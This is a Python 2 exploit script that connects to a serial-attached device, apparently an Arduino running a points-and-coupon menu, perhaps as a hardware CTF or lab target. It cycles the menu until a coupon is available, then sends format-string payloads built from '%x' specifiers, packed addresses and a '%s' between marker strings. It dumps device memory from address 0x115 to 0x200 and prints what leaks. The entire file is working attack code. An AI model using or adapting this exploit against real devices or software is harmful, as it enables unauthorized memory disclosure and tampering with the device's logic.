import sys
import struct
import string
import serial
import time
import re

#tosend = sys.argv[1]

def reset(arduino):
	print "RESET"
	arduino.setDTR(False)
	time.sleep(1)
	arduino.flushInput()
	arduino.setDTR(True)

#read until certain timeout
def readall(to=2):
	print "READ "
	ctr = 0
	s = ""
	while True:
		while ser.inWaiting()  > 0:
			c = ser.read()
			s += c
			sys.stdout.write(c),
		time.sleep(0.01)
		if ser.inWaiting()==0:
			ctr +=1
			if ctr==to*100:
				break
		else:
			ctr = 0	
	print "RESP", s.encode("hex")
	print "----"
	return s

def get_bytes(s):
	print "GET BYTES ", s
	s = s.strip().replace("\n", "")
	print s
	m1 = re.compile(r'.*balance: ([0-9]+).*')	
	space = int(m1.match(s).group(1))
	m2 = re.compile(r'.*left: ([0-9]+).*') 
	used = int(m2.match(s).group(1))
	return (space, used)

def get(addr, tosend):
	global ser
	readall()
	ser.write('4\n')
	bytes = readall()
	point,coupon = get_bytes(bytes)
        d = 1
	while coupon == 0:
		ser.write('1\n')
		readall(d)
		ser.write('s\n')
		readall(d)
		ser.write('\r\n')
		readall(d)
		ser.write('4\n')
		bytes = readall(d)
		point, coupon = get_bytes(bytes)
	ser.write('3\n')
	readall(4)
	ser.write(tosend+'\n')
        print "ADDR: ", hex(addr)
	res = readall()
        print "================="
	return res

ser = serial.Serial('/dev/ttyUSB0',19200,)  # open serial port
reset(ser)


i = 0x115

while i < 0x200:

	addr = struct.pack("<h", i) * 10

	print addr.encode("hex")

	tosend = "%x" * 5 + addr + "{<|%s|>}" 

	print tosend

	res = get(i, tosend)

	if "{<||>}" in res:
		i+=1 
		continue

	if "{<|" not in res:
		i+=1
		continue
	i1 = res.find("{<|")
	if (i1>0):
		rest = res[i1+3:]
		if "|>}" in rest:
			i2 = rest.find("|>}")
			r = rest[:i2]
			print "FOUND inside", r, len(r)
			i += len(r)
			continue
	i += 1
